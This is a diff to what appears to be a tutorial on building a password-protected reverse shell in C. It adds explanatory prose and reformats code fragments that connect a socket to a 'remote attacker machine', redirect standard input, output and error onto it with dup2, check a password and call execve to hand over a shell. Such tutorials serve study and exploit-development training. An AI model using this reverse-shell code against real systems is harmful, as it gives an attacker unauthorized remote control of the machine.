@@ -86,7 +86,7 @@ In this step we will construct our 'sockaddr' data structure and actually connec
 The connect syscall takes 3 arguments:
 
 <ul>
-    <li>The socket to bind to - We will use our new socket "sock"</li>
+    <li>The socket to bind to - We will use our new socket "sock".</li>
     <li>Data structure of the remote attacker machine, which is essentially the IP Address and port that that will be bound to the socket. This data structure consists of 4 members that are each explained below.</li>
     <li>Length of the data structure passed in argument 2. This was declared during the skeleton code stage.</li>
 </ul>
@@ -101,19 +101,24 @@ bzero(&server.sin_zero, 8); // 8 zero bytes of padding
 connect(sock, (struct sockaddr *)&server, sockaddr_len);
 ```
 
-```c
-        dup2(sock, 0);
-        dup2(sock, 1);
-        dup2(sock, 2);
+<h3>Stage 5 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>
 
-        read(sock, buf, 16);
-        buf[strcspn(buf, "\n")] = 0;
-        if (strcmp(arguments[4], buf) == 0)
-        {        
-              execve(arguments[0], &arguments[0], NULL);
-        }
-       
+For this stage we will be duplicating the file descriptor of our newly created socket and provide it with the basic shell capabilities. The dup2 syscall will do nicely for this purpose. We need to provide the file descriptor of our newly created socket and the integer assigned to STDIN (0), STDOUT (1) and STDERROR(2) to dup2.
+
+```c
+dup2(sock, 0);
+dup2(sock, 1);
+dup2(sock, 2);
+```
+
+```c
+read(sock, buf, 16);
+buf[strcspn(buf, "\n")] = 0;
+if (strcmp(arguments[4], buf) == 0)
+{        
+      execve(arguments[0], &arguments[0], NULL);
 }
+       
 ```
 
 ```nasm
